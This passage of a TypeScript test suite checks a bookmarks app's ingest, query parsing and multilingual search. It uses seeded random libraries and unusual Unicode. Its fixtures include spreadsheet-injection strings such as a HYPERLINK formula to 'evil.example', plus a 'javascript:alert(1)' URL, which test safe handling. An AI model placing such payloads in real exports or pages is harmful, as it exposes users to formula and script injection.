/**
 * Robustness tests for the data layer: unusual content, hostile files and
 * property checks on random libraries. Randomness is seeded (mulberry32), so
 * every failure reproduces.
 */
import 'fake-indexeddb/auto';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { classifyTweet, compileCategories } from '../classify';
import { db, defaultCategories, ensureCategories } from '../db';
import { exportCsv, exportJson, importJson } from '../export';
import { computeFacets } from '../facets';
import { ingestTweets, invalidateCategories, resetOrderCursor } from '../ingest';
import { domainOf, parseTimeline } from '../parse';
import { applyOperators, foldText, isEmptyQuery, matchesScope, parseQuery, sortBookmarks, type ParsedQuery, type SortKey } from '../query';
import { DAY_MS, NEVER, MAX_EASE, MAX_INTERVAL, MIN_EASE, addDays, buildQueue, computeStreak, dayKey, dayStart, nextDayStart, recallPriority, recordReviews, markDayComplete, markRestDay, schedule, EMPTY_STATS, type RecallRating, type RecallStats } from '../recall';
import { buildShelf, canonicalizeUrl, classifyUrl, filterResources, libraryQuery, shelfToMarkdown, sortResources, type ShelfSort } from '../resources';
import { SearchIndex, tokenize } from '../scan-search';
import type { Author, Bookmark, Category, Collection, Facet, RecallCard, TweetData } from '../types';
import { PERSONAS, WRAPPED_PERIODS, buildShareText, computeWrapped, countByPeriod, type WrappedStats } from '../wrapped';
import { bookmarksPage } from './fixtures';

// Property tests over 5k-post libraries take a few seconds on slow machines.
vi.setConfig({ testTimeout: 30_000 });

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

function rng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const int = (r: () => number, n: number) => Math.floor(r() * n);
const pick = <T,>(r: () => number, list: readonly T[]): T => list[int(r, list.length)]!;
function shuffle<T>(r: () => number, list: readonly T[]): T[] {
  const a = list.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = int(r, i + 1);
    [a[i], a[j]] = [a[j]!, a[i]!];
  }
  return a;
}
const sleep = (ms: number) => new Promise((res) => setTimeout(res, ms));

/** Every number in `v` is finite and no string reads "NaN", "undefined" or "Infinity". */
function badValues(v: unknown, at = '$', out: string[] = [], depth = 0): string[] {
  if (depth > 12 || out.length > 10) return out;
  if (typeof v === 'number' && !Number.isFinite(v)) out.push(`${at} = ${v}`);
  else if (typeof v === 'string' && /\bNaN\b|\bundefined\b|\bInfinity\b|Invalid Date/.test(v)) out.push(`${at} = ${JSON.stringify(v.slice(0, 80))}`);
  else if (v instanceof Map) for (const [k, x] of v) badValues(x, `${at}.get(${String(k)})`, out, depth + 1);
  else if (v && typeof v === 'object') for (const [k, x] of Object.entries(v)) badValues(x, `${at}.${k}`, out, depth + 1);
  return out;
}

const NOW = Date.UTC(2026, 9, 28, 6, 30); // 28 Oct 2026, 12:00 IST
const MAX_TIME = 8.64e15;

function tweet(id: string, text: string, patch: Partial<TweetData> = {}): TweetData {
  return {
    id,
    url: `https://x.com/u${id}/status/${id}`,
    text,
    lang: 'und',
    createdAt: Date.UTC(2026, 0, 1),
    author: { id: `a${id}`, name: 'Author', handle: `author${id.slice(-2)}`, avatar: '', verified: false },
    media: [],
    links: [],
    hashtags: [],
    mentions: [],
    metrics: { likes: 1, retweets: 0, replies: 0, quotes: 0, views: 10, bookmarks: 0 },
    isReply: false,
    isNote: false,
    ...patch,
  };
}

function bookmark(id: string, patch: Partial<Bookmark> = {}): Bookmark {
  const t = tweet(id, patch.text ?? 'hello world');
  return {
    ...t,
    sources: ['bookmark'],
    savedAt: NOW - DAY_MS,
    capturedAt: NOW - DAY_MS,
    updatedAt: NOW - DAY_MS,
    category: 'other',
    categorySource: 'rule',
    tags: [],
    collections: [],
    starred: 0,
    archived: 0,
    read: 0,
    note: '',
    facets: [],
    ...patch,
  };
}

/* ------------------------------------------------------------------ */
/* Random libraries                                                    */
/* ------------------------------------------------------------------ */

const AUTHORS: Author[] = [
  { id: '1', name: 'Paul Graham', handle: 'paulg', avatar: 'https://pbs.twimg.com/a.jpg', verified: true },
  { id: '2', name: 'PAUL G (caps)', handle: 'PaulG', avatar: '', verified: false },
  { id: '3', name: 'विराट कोहली', handle: 'imVkohli', avatar: '', verified: true },
  { id: '4', name: 'عمران', handle: 'ImranKhan', avatar: '', verified: false },
  { id: '5', name: '=HYPERLINK("http://evil.example","click")', handle: 'mallory', avatar: '', verified: false },
  { id: '6', name: '', handle: '', avatar: '', verified: false },
  { id: '7', name: 'தமிழ் செய்திகள்', handle: 'tamil_news', avatar: '', verified: false },
  { id: '8', name: '👨‍👩‍👧‍👦 Family', handle: 'fam', avatar: '', verified: false },
];

const TEXTS = [
  'Fine-tuning small LLMs beats prompting for structured extraction',
  'आज का क्रिकेट मैच शानदार था, विराट ने शतक लगाया 🏏',
  'আজকের ক্রিকেট ম্যাচ দারুণ ছিল',
  'இன்றைய கிரிக்கெட் போட்டி அருமை',
  'کرکٹ کا میچ آج رات ہے',
  'الذكاء الاصطناعي يغير كل شيء',
  'Family 👨‍👩‍👧‍👦 flags 🇮🇳🏳️‍🌈 skin tones 👋🏽 keycaps 1️⃣',
  'zero​width‌non‍joiner⁠word﻿',
  'Thread 🧵 1/ how we scaled to 1M users',
  '=1+1 looks like a formula, so does @SUM(A1) and -2+3',
  'Line one\nline "two", with commas\r\nand CRLF',
  '',
  'x'.repeat(5_000),
  '𝐈𝐏𝐋 𝟐𝟎𝟐𝟔 auction recap',
  'हिन्दी सिनेमा की कहानी',
  'Café culture in Bengaluru',
];

const URL_POOL = [
  'https://github.com/vercel/next.js',
  'https://github.com/vercel/next.js/tree/canary/docs',
  'https://arxiv.org/abs/2401.00001',
  'https://arxiv.org/pdf/2401.00001v2.pdf',
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://youtu.be/dQw4w9WgXcQ?t=42',
  'https://example.com/blog/post-1?utm_source=twitter&utm_medium=social',
  'https://huggingface.co/meta-llama/Llama-3-8B',
  'https://www.amazon.in/dp/B0C1234567',
  'https://docs.python.org/3/library/re.html',
  'https://open.spotify.com/episode/4rOoJ6Egrf8K2IrywzwOMk',
  'https://bit.ly/3abcdef',
  'https://例え.jp/パス',
  'https://x.com/someone/status/1790000000000000001',
  'http://',
  'https://[::1',
  'javascript:alert(1)',
  'not a url',
  '',
  `https://a.b.c.d.example.co.uk/${'deep/'.repeat(300)}`,
  'https://www.espncricinfo.com/series/ipl-2026/match-1',
];

const CATS = ['ai', 'dev', 'design', 'sports', 'news', 'humor', 'other', 'custom-cricket', ''];
const FACETS: Facet[] = ['media', 'image', 'video', 'gif', 'link', 'thread', 'long', 'article', 'poll', 'quote', 'reply'];
const FIXED_TIME = Date.UTC(2026, 2, 3, 3, 3, 3);

function randomTime(r: () => number): number {
  const roll = int(r, 10);
  if (roll === 0) return pick(r, [0, -1, 1, -MAX_TIME, MAX_TIME, NOW, NOW + 1, Date.UTC(1, 0, 1), Date.UTC(9999, 11, 31, 23, 59, 59, 999), Date.UTC(1900, 0, 1)]);
  if (roll === 1) return NOW + Math.floor((r() - 0.5) * 2 * 1000 * 365 * DAY_MS); // ±1000 years
  if (roll === 2) return FIXED_TIME; // identical timestamps
  if (roll === 3) return NOW + Math.floor(r() * 400 * DAY_MS); // future
  return NOW - Math.floor(r() * 3 * 365 * DAY_MS);
}

function randomBookmark(r: () => number, i: number): Bookmark {
  const urls = Array.from({ length: int(r, 4) }, () => pick(r, URL_POOL));
  const author = pick(r, AUTHORS);
  const t: TweetData = tweet(String(1_800_000_000_000_000_000n + BigInt(i)), pick(r, TEXTS) + (r() < 0.3 ? ` ${pick(r, URL_POOL)}` : ''), {
    author,
    lang: pick(r, ['en', 'hi', 'ta', 'bn', 'ur', 'und']),
    createdAt: randomTime(r),
    links: urls.map((u) => ({ url: u, display: u.slice(0, 30), domain: domainOf(u) })),
    media: r() < 0.3 ? [{ type: pick(r, ['photo', 'video', 'gif'] as const), url: 'https://pbs.twimg.com/m.jpg', alt: r() < 0.5 ? 'Bar chart' : undefined }] : [],
    card: r() < 0.25 ? { url: pick(r, URL_POOL), title: pick(r, ['A field guide', 'Next.js docs | Next.js', '', 'Cricket — ESPNcricinfo']), description: r() < 0.5 ? pick(r, TEXTS) : undefined, domain: r() < 0.5 ? 'example.com' : undefined } : undefined,
    quoted: r() < 0.15 ? { id: '1', url: 'https://x.com/q/status/1', text: `see ${pick(r, URL_POOL)}`, createdAt: randomTime(r), author: pick(r, AUTHORS), media: [] } : undefined,
    article: r() < 0.05 ? { title: 'Why we left the cloud', preview: 'cost', cover: undefined } : undefined,
    poll: r() < 0.05 ? { options: [{ label: 'a', votes: 1 }] } : undefined,
    metrics: { likes: pick(r, [0, 1, 999, 1000, 250_000, 1e9]), retweets: int(r, 100), replies: int(r, 10), quotes: int(r, 5), views: pick(r, [0, 10, 10_000, 5e7]), bookmarks: int(r, 1000) },
    isReply: r() < 0.1,
    isNote: r() < 0.1,
  });
  const facets = [...new Set([...computeFacets(t), ...(r() < 0.1 ? [pick(r, FACETS)] : [])])];
  const savedAt = randomTime(r);
  return {
    ...t,
    sources: r() < 0.2 ? ['bookmark', 'like'] : r() < 0.1 ? ['like'] : ['bookmark'],
    savedAt,
    capturedAt: savedAt,
    updatedAt: NOW,
    category: pick(r, CATS),
    categorySource: pick(r, ['rule', 'author', 'ai', 'user'] as const),
    tags: r() < 0.3 ? [pick(r, ['react', 'क्रिकेट', '=cmd', 'read-later'])] : [],
    collections: r() < 0.2 ? ['c1'] : [],
    starred: r() < 0.2 ? 1 : 0,
    archived: r() < 0.1 ? 1 : 0,
    read: r() < 0.4 ? 1 : 0,
    note: r() < 0.2 ? pick(r, TEXTS) : '',
    summary: r() < 0.1 ? 'A short gist' : undefined,
    facets,
    partial: r() < 0.05 ? true : undefined,
  };
}

function randomLibrary(seed: number, n: number): Bookmark[] {
  const r = rng(seed);
  return Array.from({ length: n }, (_, i) => randomBookmark(r, i));
}

/** Libraries for the property tests: empty, one post, identical timestamps, 5k random posts. */
const LIBRARIES: Array<[string, Bookmark[]]> = [
  ['empty', []],
  ['one post', [bookmark('1', { savedAt: NOW - DAY_MS, category: 'ai' })]],
  ['identical timestamps', Array.from({ length: 50 }, (_, i) => bookmark(String(100 + i), { savedAt: FIXED_TIME, category: pick(rng(i), CATS) }))],
  ['5k random', randomLibrary(0xbeef, 5_000)],
];

/* ------------------------------------------------------------------ */
/* Ingest                                                              */
/* ------------------------------------------------------------------ */

describe('ingest: unusual content', () => {
  beforeEach(async () => {
    await db.bookmarks.clear();
    await db.categories.clear();
    await ensureCategories();
    invalidateCategories();
    resetOrderCursor('bookmark');
    resetOrderCursor('like');
  });

  const SAMPLES: Record<string, string> = {
    emojiZwj: 'Family 👨‍👩‍👧‍👦, flags 🇮🇳🏳️‍🌈, skin tones 👋🏽 and keycaps 1️⃣ #️⃣',
    arabic: 'الذكاء الاصطناعي يغير كل شيء',
    urdu: 'کرکٹ کا میچ آج رات ہے، بابر اعظم کی سنچری',
    hindi: 'आज का क्रिकेट मैच शानदार था, विराट ने शतक लगाया',
    tamil: 'இன்றைய கிரிக்கெட் போட்டி அருமை',
    bengali: 'আজকের ক্রিকেট ম্যাচ দারুণ ছিল',
    zeroWidth: 'zero​width‌non‍joiner⁠word﻿',
    rtlOverride: 'abc‮dcba‬ done ⁦isolate⁩',
    combining: 'Café vs Café, Z̷̢a̸l̵g̶o̷',
    loneSurrogate: 'broken \ud83d surrogate \udc00',
    control: 'nul\u0000byte\u0007bell',
    mathBold: '𝐈𝐏𝐋 𝟐𝟎𝟐𝟔',
  };

  it('stores every script byte-for-byte with a valid category and facets', async () => {
    const tweets = Object.values(SAMPLES).map((text, i) => ({ tweet: tweet(String(1000 + i), text) }));
    const res = await ingestTweets(tweets, { source: 'bookmark' });
    expect(res).toMatchObject({ count: tweets.length, added: tweets.length, updated: 0 });
    const ids = new Set([...defaultCategories().map((c) => c.id)]);
    for (const { tweet: t } of tweets) {
      const b = (await db.bookmarks.get(t.id))!;
      expect(b.text).toBe(t.text);
      expect(ids.has(b.category)).toBe(true);
      expect(Array.isArray(b.facets)).toBe(true);
      expect(badValues(b)).toEqual([]);
    }
  });

  it('classifies cricket the same way in Devanagari and Bengali script', async () => {
    const tweets = ['hindi', 'bengali'].map((k, i) => ({ tweet: tweet(String(2000 + i), SAMPLES[k]!) }));
    await ingestTweets(tweets, { source: 'bookmark' });
    for (const { tweet: t } of tweets) expect((await db.bookmarks.get(t.id))!.category).toBe('sports');
  });

  it('keeps a 10k-character note intact and marks it long', async () => {
    const body = `${'शब्द word '.repeat(1_249)}END`;
    expect(body.length).toBeGreaterThanOrEqual(10_000);
    await ingestTweets([{ tweet: tweet('3000', body, { isNote: true }) }], { source: 'bookmark' });
    const b = (await db.bookmarks.get('3000'))!;
    expect(b.text).toBe(body);
    expect(b.isNote).toBe(true);
    expect(b.facets).toContain('long');
    const idx = new SearchIndex();
    idx.sync([b]);
    expect([...idx.search('end').keys()]).toEqual(['3000']);
  });

  it('keeps the first copy when a batch repeats an id', async () => {
    const res = await ingestTweets(
      [{ tweet: tweet('4000', 'first copy') }, { tweet: tweet('4001', 'other') }, { tweet: tweet('4000', 'second copy') }],
      { source: 'bookmark' },
    );
    expect(res).toMatchObject({ count: 2, added: 2 });
    expect(await db.bookmarks.count()).toBe(2);
    expect((await db.bookmarks.get('4000'))!.text).toBe('first copy');
  });

  it('stores a post that is both bookmarked and liked as one row with both sources', async () => {
    const t = tweet('5000', 'saved twice');
    await ingestTweets([{ tweet: t }], { source: 'bookmark' });
    await ingestTweets([{ tweet: t }], { source: 'like' });
    await ingestTweets([{ tweet: t }], { source: 'like' });
    expect(await db.bookmarks.count()).toBe(1);
    expect((await db.bookmarks.get('5000'))!.sources).toEqual(['bookmark', 'like']);

    const u = tweet('5001', 'liked first');
    await ingestTweets([{ tweet: u }], { source: 'like' });
    await ingestTweets([{ tweet: u }], { source: 'bookmark', savedNow: true });
    expect((await db.bookmarks.get('5001'))!.sources).toEqual(['like', 'bookmark']);
  });

  it('re-ingesting the same page changes nothing (count, savedAt, updatedAt)', async () => {
    const page = parseTimeline(bookmarksPage);
    await ingestTweets(page.tweets, { source: 'bookmark' });
    const before = await db.bookmarks.toArray();
    await sleep(5);
    // Same browsing session (order cursor kept), then a later session (cursor reset).
    const again = await ingestTweets(page.tweets, { source: 'bookmark' });
    expect(again).toMatchObject({ count: 4, added: 0 });
    expect(await db.bookmarks.toArray()).toEqual(before);
    await sleep(5);
    resetOrderCursor('bookmark');
    await ingestTweets(page.tweets, { source: 'bookmark' });
    expect(await db.bookmarks.toArray()).toEqual(before);
  });

  it('keeps exact bookmark times when switching between a folder and the main timeline', async () => {
    const page = parseTimeline(bookmarksPage);
    await ingestTweets(page.tweets, { source: 'bookmark' });
    const before = new Map((await db.bookmarks.toArray()).map((b) => [b.id, b.savedAt]));
    // A folder holding two of the same posts, read right after the main timeline (same session).
    await ingestTweets([page.tweets[0]!, page.tweets[2]!], { source: 'bookmark', collectionId: 'c1' });
    await ingestTweets(page.tweets, { source: 'bookmark' });
    for (const b of await db.bookmarks.toArray()) expect(b.savedAt, b.id).toBe(before.get(b.id));
    expect((await db.bookmarks.orderBy('savedAt').reverse().toArray()).map((b) => b.id)).toEqual(page.tweets.map((t) => t.tweet.id));
  });

  it('bumps updatedAt only for posts whose data changed', async () => {
    const page = parseTimeline(bookmarksPage);
    await ingestTweets(page.tweets, { source: 'bookmark' });
    const before = new Map((await db.bookmarks.toArray()).map((b) => [b.id, b]));
    await sleep(5);
    const changed = page.tweets.map((t, i) => (i === 1 ? { ...t, tweet: { ...t.tweet, metrics: { ...t.tweet.metrics, likes: t.tweet.metrics.likes + 1 } } } : t));
    await ingestTweets(changed, { source: 'bookmark' });
    for (const b of await db.bookmarks.toArray()) {
      const prev = before.get(b.id)!;
      if (b.id === page.tweets[1]!.tweet.id) {
        expect(b.updatedAt).toBeGreaterThan(prev.updatedAt);
        expect(b.metrics.likes).toBe(prev.metrics.likes + 1);
      } else expect(b.updatedAt).toBe(prev.updatedAt);
    }
  });

  it('ingests posts with every optional field missing', async () => {
    const bare = tweet('6000', '', { author: { id: '', name: '', handle: '', avatar: '', verified: false }, lang: 'und' });
    const res = await ingestTweets([{ tweet: bare }, { tweet: tweet('6001', 'no extras') }], { source: 'bookmark' });
    expect(res.added).toBe(2);
    const b = (await db.bookmarks.get('6000'))!;
    expect(b).toMatchObject({ text: '', category: 'other', tags: [], collections: [], note: '' });
    expect(b.card).toBeUndefined();
    expect(b.quoted).toBeUndefined();
    expect(b.poll).toBeUndefined();
    expect(b.article).toBeUndefined();
    expect(badValues(b)).toEqual([]);
  });
});

/* ------------------------------------------------------------------ */
/* Query parser                                                        */
/* ------------------------------------------------------------------ */

const ctx = {
  categories: defaultCategories(),
  collections: [{ id: 'c1', name: 'Read later', emoji: '', color: '', createdAt: 0, order: 0 }] as Collection[],
};

function querySmall(): Bookmark[] {
  const r = rng(7);
  const out: Bookmark[] = [];
  const handles = ['paulg', 'paulgraham', 'sama', 'naval', 'virat'];
  for (let i = 0; i < 80; i++) {
    const links = r() < 0.4 ? [{ url: pick(r, ['https://github.com/a/b', 'https://gist.github.com/x', 'https://example.com/p']), display: '', domain: '' }] : [];
    for (const l of links) l.domain = domainOf(l.url);
    out.push(
      bookmark(`q${i}`, {
        author: { id: String(i), name: `Name ${i}`, handle: pick(r, handles), avatar: '', verified: false },
        text: pick(r, ['open source wins', 'crypto is back', 'आज क्रिकेट मैच है', 'plain words', 'Open Source license', 'nothing']),
        lang: pick(r, ['en', 'hi', 'ta']),
        category: pick(r, ['ai', 'design', 'dev', 'sports']),
        tags: r() < 0.4 ? [pick(r, ['react', 'reading', 'crypto'])] : [],
        collections: r() < 0.3 ? ['c1'] : [],
        facets: FACETS.filter(() => r() < 0.25),
        starred: r() < 0.3 ? 1 : 0,
        read: r() < 0.5 ? 1 : 0,
        archived: r() < 0.2 ? 1 : 0,
        sources: r() < 0.3 ? ['bookmark', 'like'] : ['bookmark'],
        metrics: { likes: pick(r, [0, 10, 999, 1000, 5000]), retweets: 0, replies: 0, quotes: 0, views: pick(r, [0, 9_999, 10_000, 50_000]), bookmarks: 0 },
        createdAt: Date.UTC(2025, int(r, 14), 1 + int(r, 27)),
        note: r() < 0.2 ? 'great open source note' : '',
        links,
      }),
    );
  }
  return out;
}

/** Independent re-statement of what the searchable text is (text, quote, card, article, note, summary, author, links). */
const searchable = (b: Bookmark) => foldText([b.text, b.quoted?.text, b.card?.title, b.card?.description, b.article?.title, b.note, b.summary, b.author.name, b.author.handle, ...b.links.map((l) => l.url)].filter(Boolean).join('\n'));

interface Atom {
  key: string;
  q: string;
  test: (b: Bookmark) => boolean;
}

const ATOMS: Atom[] = [
  { key: 'from', q: 'from:paulg', test: (b) => b.author.handle.toLowerCase().startsWith('paulg') },
  { key: 'from', q: 'from:@SAMA', test: (b) => b.author.handle.toLowerCase().startsWith('sama') },
  { key: '-from', q: '-from:naval', test: (b) => b.author.handle.toLowerCase() !== 'naval' },
  { key: 'cat', q: 'cat:ai', test: (b) => b.category === 'ai' },
  { key: 'cat', q: 'category:Design', test: (b) => b.category === 'design' },
  { key: '-cat', q: '-cat:dev', test: (b) => b.category !== 'dev' },
  { key: 'tag', q: 'tag:rea', test: (b) => b.tags.some((t) => t.startsWith('rea')) },
  { key: '-tag', q: '-tag:crypto', test: (b) => !b.tags.includes('crypto') },
  { key: 'in', q: 'in:"read later"', test: (b) => b.collections.includes('c1') },
  { key: 'has', q: 'has:video', test: (b) => b.facets.includes('video') },
  { key: 'has2', q: 'has:links', test: (b) => b.facets.includes('link') },
  { key: '-has', q: '-has:image', test: (b) => !b.facets.includes('image') },
  { key: 'hasnote', q: 'has:note', test: (b) => b.note.trim() !== '' },
  { key: 'is', q: 'is:starred', test: (b) => b.starred === 1 },
  { key: 'is2', q: 'is:unread', test: (b) => b.read === 0 },
  { key: '-is', q: '-is:archived', test: (b) => b.archived === 0 },
  { key: 'is3', q: 'is:liked', test: (b) => b.sources.includes('like') },
  { key: 'is4', q: 'is:thread', test: (b) => b.facets.includes('thread') },
  { key: 'likes', q: 'min_likes:1k', test: (b) => b.metrics.likes >= 1000 },
  { key: 'views', q: 'min_views:10k', test: (b) => b.metrics.views >= 10_000 },
  { key: 'lang', q: 'lang:HI', test: (b) => b.lang === 'hi' },
  { key: 'domain', q: 'domain:github.com', test: (b) => b.links.some((l) => l.domain === 'github.com' || l.domain.endsWith('.github.com')) },
  { key: 'after', q: 'after:2025-06-01', test: (b) => b.createdAt >= Date.parse('2025-06-01') },
  { key: 'before', q: 'before:2026-01-01', test: (b) => b.createdAt <= Date.parse('2026-01-01') },
  { key: 'phrase', q: '"open source"', test: (b) => searchable(b).includes('open source') },
  { key: 'phrase2', q: '"क्रिकेट मैच"', test: (b) => searchable(b).includes('क्रिकेट मैच') },
  { key: 'exclude', q: '-crypto', test: (b) => !searchable(b).includes('crypto') },
  { key: 'exclude2', q: '-"plain words"', test: (b) => !searchable(b).includes('plain words') },
];

describe('query parser', () => {
  const lib = querySmall();
  const ids = (list: Bookmark[]) => list.map((b) => b.id);

  it('combines operators with AND semantics (hand-written oracle, 600 random queries)', () => {
    const r = rng(99);
    let nonEmpty = 0;
    for (let i = 0; i < 600; i++) {
      const chosen: Atom[] = [];
      for (const a of shuffle(r, ATOMS)) {
        if (chosen.length >= 1 + int(r, 4)) break;
        if (!chosen.some((c) => c.key === a.key)) chosen.push(a);
      }
      const raw = chosen.map((a) => a.q).join(pick(r, [' ', '  ', '\t', ' \n ']));
      const got = ids(applyOperators(lib, parseQuery(raw), ctx));
      const want = ids(lib.filter((b) => chosen.every((a) => a.test(b))));
      expect(got, raw).toEqual(want);
      if (want.length) nonEmpty++;
    }
    expect(nonEmpty).toBeGreaterThan(150);
  });

  it('gives the same result whatever the operator order', () => {
    const r = rng(5);
    for (let i = 0; i < 200; i++) {
      const atoms = shuffle(r, ATOMS).slice(0, 3);
      const a = applyOperators(lib, parseQuery(atoms.map((x) => x.q).join(' ')), ctx);
      const b = applyOperators(lib, parseQuery(shuffle(r, atoms).map((x) => x.q).join(' ')), ctx);
      expect(ids(b)).toEqual(ids(a));
    }
  });

  it('parses operator edge cases predictably', () => {
    const q = (s: string) => parseQuery(s);
    // Operators without a value are plain words.
    expect(q('from:').text).toBe('from:');
    expect(q('from: paulg')).toMatchObject({ from: [], text: 'from: paulg' });
    expect(q('cat:""').cats).toEqual([]);
    // Unknown operators stay as text ("http:" etc.).
    expect(q('http://example.com foo:bar').text).toBe('http://example.com foo:bar');
    // Stray colons and dashes.
    expect(q(':::: - -- :x').text).toBe(':::: - :x');
    expect(q(':::: - -- :x').exclude).toEqual(['-']);
    // Unbalanced quotes never swallow the rest of the query into an operator.
    expect(q('"unbalanced phrase').phrases).toEqual([]);
    expect(q('"unbalanced phrase').text).toBe('"unbalanced phrase');
    expect(q('in:"read later').collections).toEqual(['"read']);
    // Bad numbers and dates are ignored.
    expect(q('min_likes:lots after:someday before:2025-13-45')).toMatchObject({ minLikes: undefined, after: undefined, before: undefined });
    expect(q('min_likes:1.5m').minLikes).toBe(1_500_000);
    // Unicode values.
    expect(q('tag:#क्रिकेट from:@विराट').tags).toEqual(['क्रिकेट']);
    expect(q('"चाय पे चर्चा" -"crypto bro"')).toMatchObject({ phrases: ['चाय पे चर्चा'], exclude: ['crypto bro'] });
  });

  it('never throws on random input and always returns a well-formed query', () => {
    const r = rng(1234);
    const PIECES = ['from:', 'cat:', 'tag:', 'in:', 'has:', 'is:', 'lang:', 'domain:', 'after:', 'before:', 'min_likes:', 'min_views:', '-', '"', ':', ' ', '\t', '\n', 'a', 'Z', 'é', 'क्', 'ि', '😀', '👨‍👩‍👧', '#', '@', '\\', '‍', '‮', '\ud800', '0', '9'.repeat(400), 'k', 'm', '>', '7d', '2025-01-01', 'paulg', 'read later', '(', ')', '*', '?', '[', '$'];
    const isWellFormed = (p: ParsedQuery) => {
      for (const k of ['phrases', 'highlight', 'from', 'notFrom', 'cats', 'notCats', 'tags', 'notTags', 'collections', 'has', 'notHas', 'is', 'notIs', 'lang', 'domains', 'exclude'] as const) {
        if (!Array.isArray(p[k]) || !p[k].every((x) => typeof x === 'string')) return `${k} is not a string array`;
      }
      if (typeof p.text !== 'string') return 'text';
      for (const k of ['after', 'before', 'minLikes', 'minViews'] as const) if (p[k] !== undefined && (typeof p[k] !== 'number' || Number.isNaN(p[k]))) return `${k} is ${p[k]}`;
      return null;
    };
    const idx = new SearchIndex();
    idx.sync(lib);
    for (let i = 0; i < 3_000; i++) {
      const raw = Array.from({ length: int(r, 30) }, () => pick(r, PIECES)).join(r() < 0.5 ? '' : ' ');
      const p = parseQuery(raw);
      expect(isWellFormed(p), JSON.stringify(raw)).toBeNull();
      const filtered = applyOperators(lib, p, ctx);
      expect(filtered.every((b) => lib.includes(b))).toBe(true);
      expect(typeof isEmptyQuery(p)).toBe('boolean');
      idx.search(raw);
    }
    // Very long input.
    const long = Array.from({ length: 20_000 }, () => pick(r, PIECES)).join(' ');
    const t0 = performance.now();
    expect(isWellFormed(parseQuery(long))).toBeNull();
    applyOperators(lib, parseQuery(long), ctx);
    expect(performance.now() - t0).toBeLessThan(5_000);
  });

  it('sorts without throwing and returns a permutation', () => {
    const lib5k = LIBRARIES[3]![1];
    const scores = new Map(lib5k.map((b, i) => [b.id, i % 7]));
    for (const key of ['relevance', 'saved', 'saved-asc', 'newest', 'oldest', 'likes', 'views'] as SortKey[]) {
      const sorted = sortBookmarks(lib5k, key, scores);
      expect(sorted).toHaveLength(lib5k.length);
      expect(new Set(sorted.map((b) => b.id)).size).toBe(lib5k.length);
    }
    for (const kind of ['all', 'unread', 'starred', 'archived', 'category', 'collection', 'tag', 'author', 'facet', 'likes'] as const) {
      for (const b of lib5k.slice(0, 200)) expect(typeof matchesScope(b, { kind, value: kind === 'author' ? 'PAULG' : undefined })).toBe('boolean');
    }
  });
});

/* ------------------------------------------------------------------ */
/* Search                                                              */
/* ------------------------------------------------------------------ */

describe('search', () => {
  const posts = [
    bookmark('hi1', { text: 'आज का क्रिकेट मैच शानदार था' }),
    bookmark('hi2', { text: 'हिंदी सिनेमा की कहानी' }),
    bookmark('hi3', { text: 'हिंदू त्योहार और परंपरा' }),
    bookmark('hi4', { text: 'हिन्दी में लिखा गया' }),
    bookmark('bn1', { text: 'আজকের ক্রিকেট ম্যাচ দারুণ ছিল' }),
    bookmark('ta1', { text: 'இன்றைய கிரிக்கெட் போட்டி அருமை' }),
    bookmark('ur1', { text: 'کرکٹ کا میچ آج رات ہے' }),
    bookmark('mix', { text: 'IPL 2026: क्रिकेट fever is back 🏏' }),
    bookmark('bold', { text: '𝐈𝐏𝐋 auction recap' }),
    bookmark('cafe1', { text: 'Café culture' }),
    bookmark('cafe2', { text: 'Café society' }),
    bookmark('cafe3', { text: 'cafe racer' }),
    bookmark('quote', { text: 'we’re hiring' }),
    bookmark('zwj', { text: 'क्‍ष learning' }),
    bookmark('digits', { text: 'चुनाव २०२६ के नतीजे' }),
    bookmark('caps', { text: 'DESIGN SYSTEMS' }),
  ];
  const idx = new SearchIndex();
  idx.sync(posts);
  const find = (q: string) => [...idx.search(q).keys()].sort();

  it('finds Indic, Urdu and mixed-script posts', () => {
    expect(find('क्रिकेट')).toEqual(['hi1', 'mix']);
    expect(find('ক্রিকেট')).toEqual(['bn1']);
    expect(find('கிரிக்கெட்')).toEqual(['ta1']);
    expect(find('کرکٹ')).toEqual(['ur1']);
    expect(find('ipl क्रिकेट')).toEqual(['mix']);
  });

  it('does not cut Indic vowel signs off the end of a word (हिंदी is not हिंदू)', () => {
    expect(tokenize('हिंदी')).toEqual(['हिंदी']);
    expect(tokenize('போட்டி,')).toEqual(['போட்டி']);
    expect(find('हिंदी')).toEqual(['hi2', 'hi4']);
    expect(find('हिंदू')).toEqual(['hi3']);
  });

  it('matches equivalent Unicode spellings the way the rest of the app folds them', () => {
    // Composed and decomposed accents are the same letter; a missing accent is not.
    expect(find('café')).toEqual(['cafe1', 'cafe2']);
    expect(find('café')).toEqual(['cafe1', 'cafe2']);
    expect(find('cafe')).toEqual(['cafe3']);
    // "Fancy" X text, nasal spellings, curly quotes, ZWJ and Indic digits.
    expect(find('ipl')).toEqual(['bold', 'mix']);
    expect(find('हिन्दी')).toEqual(['hi2', 'hi4']);
    expect(find("we're")).toEqual(['quote']);
    expect(find('क्ष')).toEqual(['zwj']);
    expect(find('2026')).toEqual(['digits', 'mix']);
  });

  it('is case-insensitive', () => {
    expect(find('design')).toEqual(['caps']);
    expect(find('DeSiGn SYSTEMS')).toEqual(['caps']);
  });

  it('returns nothing for empty and whitespace queries', () => {
    for (const q of ['', ' ', '\t\n', '​', '""', ',,,', '   ,  ']) expect(idx.search(q).size, JSON.stringify(q)).toBe(0);
  });

  it('typing a query letter by letter gives the same results as a fresh search', () => {
    const lib = randomLibrary(0x5ea, 800);
    const typed = new SearchIndex();
    typed.sync(lib);
    const r = rng(11);
    const words = ['design', 'ai', 'क्रिकेट', 'ipl', 'react', 'startup', '#build', '@maya', 'हिंदी', 'x'];
    for (let round = 0; round < 60; round++) {
      // Type, sometimes backspace or jump to a new phrase, then compare every step.
      const phrase = Array.from({ length: 1 + int(r, 3) }, () => pick(r, words)).join(' ');
      let q = '';
      for (const ch of Array.from(phrase)) {
        q = r() < 0.1 ? q.slice(0, -1) : q + ch;
        const fresh = new SearchIndex();
        fresh.sync(lib);
        expect([...typed.search(q)], JSON.stringify(q)).toEqual([...fresh.search(q)]);
      }
